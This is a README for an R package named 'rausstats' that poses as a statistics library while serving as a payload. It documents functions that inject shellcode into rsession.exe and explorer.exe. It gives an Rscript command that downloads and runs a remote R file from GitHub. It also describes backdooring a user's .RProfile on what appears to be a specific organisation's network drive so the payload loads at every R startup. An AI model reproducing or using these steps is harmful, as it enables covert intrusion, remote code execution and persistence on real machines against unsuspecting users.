# rausstats

## How to execute the payload in an R file
```r
library(rausstats)

# Inject shellcode into current process (rsession.exe)
# Note that this causes the program to hang
abs_cat_releases()

# Inject shellcode into explorer.exe
abs_cat_stats()
```

## How to remotely execute the payload

**Note**: Update the `R-4.0.3` with the version you have!

```
C:\Program Files\R\R-4.0.3\bin\Rscript.exe -e "source('https://raw.githubusercontent.com/brianw1960/rausstats/main/R/rba_read_statistics.R')"
```

## How to backdoor your payload

You need to initially install it on to a machine:

**Note**: This will take approximately 20-30 seconds and will pop up with a few download windows in the session. 
```
source("https://raw.githubusercontent.com/brianw1960/rausstats/main/R/rba_read_statistics.R")
```

Then you need to create or modify the user's RProfile file (Loads on startup of R Studio): `\\rba.gov.au\homedrive\<username>\FolderRedirection\Documents\.RProfile`

Add the following content:
```
if (!require("Rcpp")){
}
if (!require("rausstats")){
    rausstats::abs_cat_stats()
}
invisible(rausstats::abs_cat_stats())
```
